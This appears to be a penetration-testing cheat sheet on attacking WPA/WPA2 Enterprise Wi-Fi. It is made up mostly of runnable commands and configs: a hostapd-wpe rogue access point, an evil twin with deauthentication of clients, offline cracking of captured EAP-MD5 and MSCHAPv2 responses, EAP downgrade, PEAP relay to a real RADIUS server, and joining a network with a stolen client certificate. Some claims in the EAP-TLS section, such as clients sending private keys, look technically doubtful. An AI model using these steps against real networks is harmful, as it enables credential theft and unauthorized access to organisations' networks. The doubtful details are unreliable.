---
title: "WPA / WPA2 (EAP)"
---

# WPA/WPA2 Enterprise

::: tip Overview
WPA Enterprise uses **802.1X/EAP** authentication against a **RADIUS** server. No shared PSK - each user has individual credentials (AD username/password or certificate).

**Attack surface:** Rogue AP + RADIUS server to capture challenges/hashes, then crack offline or relay.
:::

::: details Lexicon
| Term | Definition |
|------|------------|
| **EAP** | Extensible Authentication Protocol - framework for authentication methods |
| **RADIUS** | Backend authentication server (FreeRADIUS, Windows NPS) |
| **EAP-TLS** | Mutual certificate authentication - client AND server have certs (most secure) |
| **EAP-PEAP** | Protected EAP - TLS tunnel + inner MSCHAPv2 (Windows AD default) |
| **EAP-TTLS** | Tunneled TLS - inner PAP/CHAP/MSCHAPv2 (common on Linux/Android) |
| **EAP-MD5** | Simple MD5 challenge-response (weak, rare) |
| **MSCHAPv2** | Microsoft CHAP v2 - crackable offline, used inside PEAP |
| **EAP-FAST** | Cisco's EAP method - vulnerable to downgrade attacks |
:::

## Reconnaissance

```bash
# Enterprise = "MGT" in AUTH column
airodump-ng $interface
```

```bash
# Fingerprint with Metasploit
auxiliary/scanner/wifi/wifi_eapol_test
```

## Tools Setup

::: details hostapd-wpe (Wireless Pwnage Edition)

```ini
interface=$interface
ssid=$ssid
channel=$channel
hw_mode=g
wpa=2
wpa_key_mgmt=WPA-EAP
wpa_pairwise=CCMP
auth_algs=3

# Enable all EAP methods
eap_server=1
ieee8021x=1
eap_user_file=hostapd-wpe.eap_user

# Logging
logger_syslog=-1
logger_syslog_level=2
logger_stdout=-1
logger_stdout_level=2

# Certificates (auto-generated on first run)
ca_cert=/path/to/hostapd-wpe/certs/ca.pem
server_cert=/path/to/hostapd-wpe/certs/server.pem
private_key=/path/to/hostapd-wpe/certs/server.key
```

:::

```bash
hostapd-wpe hostapd-wpe.conf
# Captured credentials saved to /tmp/hostapd-wpe/
```

### EAP-MD5 Cracking

::: tip EAP-MD5
Simple MD5 challenge-response. No TLS tunnel - credentials exposed in cleartext if MITM'd. Rare but sometimes found on legacy printers/IoT.
:::

```bash
# hostapd-wpe automatically handles EAP-MD5
# Challenge/response saved to /tmp/hostapd-wpe/eapmd5-challenge.txt
```

### Crack

- [eapmd5pass](https://github.com/joswr1ght/eapmd5pass)

```bash
eapmd5pass -r eapmd5-challenge.txt -w rockyou.txt
```

## PEAP / MSCHAPv2 Cracking

Most common Enterprise deployment (Windows AD with NPS). Client validates server certificate -> sends MSCHAPv2 inside TLS tunnel.

::: tip Attack Overview

1. Setup rogue AP with hostapd-wpe
2. Client connects (certificate warning ignored or cert not validated)
3. Capture MSCHAPv2 challenge/response
4. Crack offline

:::

Capture (hostapd-wpe output):

```text
username: DOMAIN\jdoe
challenge: a1b2c3d4e5f6a1b2
response: 00112233445566778899aabbccddeeff:11223344556677889900aabbccddeeff00
```

### Crack

- [asleap](https://github.com/joswr1ght/asleap)

::: code-group

```bash [asleap]
asleap -C $challenge -R $response -w rockyou.txt
```

```bash [hashcat]
# Convert to hashcat format (NetNTLMv1)
# Format: username::domain:challenge:response

hashcat -m 5500 hash.txt rockyou.txt
```

:::

## EAP Downgrade Attack

Force client to use weaker EAP method when AP supports multiple.

### Enumeration (find supported EAP types):

::: details wpa.conf

```ini
network={
  ssid="$ssid"
  key_mgmt=WPA-EAP
  eap=PEAP
  identity="test"
  password="test"
}
```

```bash
wpa_supplicant -dd -i $interface -c wpa.conf
sudo dhclient $interface
```

:::

### Attack (hostapd-wpe.conf additions)

```bash
# Accept any EAP method
eap_fast_unauth_provisioning=1
eap_sim_aka_support=1

# Downgrade EAP-TLS to PEAP if possible
# Client will fallback to weaker method if available
```

## Enterprise Evil Twin

Spoof target SSID with malicious RADIUS server.

### Setup

```bash
# Start rogue AP
hostapd-wpe -s "$ssid" hostapd-wpe.conf

# Optionally deauth clients from legit AP
aireplay-ng -0 10 -a $bssid $interface

# Wait for connections
tail -f /tmp/hostapd-wpe/hostapd-wpe.log
```

## PEAP Relay Attack

Relay captured `MSCHAPv2` to legitimate RADIUS server -> authenticate without cracking.

::: warning Why relay?
MSCHAPv2 cracking can take days. Relay gives instant access by forwarding challenge/response to real RADIUS.
:::

- [PEAPRelay](https://github.com/trustedsec/PEAPRelay)

```bash
# Edit config with target RADIUS server
# radius_server = legit-radius.company.local
# radius_secret = (sniffed or brute forced)

# Run relay
python peaprelay.py -c config.ini
```

## Attacking EAP-TLS

EAP-TLS uses mutual authentication: client and server present certificates.

::: tip Misconfiguration attack (client doesn't validate server cert):

- hostapd-wpe with EAP-TLS enabled
- Client connects and sends its certificate BEFORE validating server
- Certificate saved to /tmp/hostapd-wpe/client_cert.pem

:::

### Extract certifiate info

```bash
openssl x509 -in client_cert.pem -text -noout
openssl x509 -in client_cert.pem -subject -issuer -dates
```

### Use stolen certificate

::: details wpa.conf

```bash
# wpa.conf
network={
  ssid="$ssid"
  key_mgmt=WPA-EAP
  eap=TLS
  identity="$username"
  ca_cert="ca.pem"
  client_cert="stolen.pem"
  private_key="stolen.key"
}
```

```bash
wpa_supplicant -i $interface -c wpa.conf
sudo dhclient $interface
```

:::

::: warning Private key
Certificate alone is not enough. If client sends full `PKCS#12 (.p12/.pfx)` with private key, you can fully impersonate them. Check captured files for `.p12` bundles.
:::
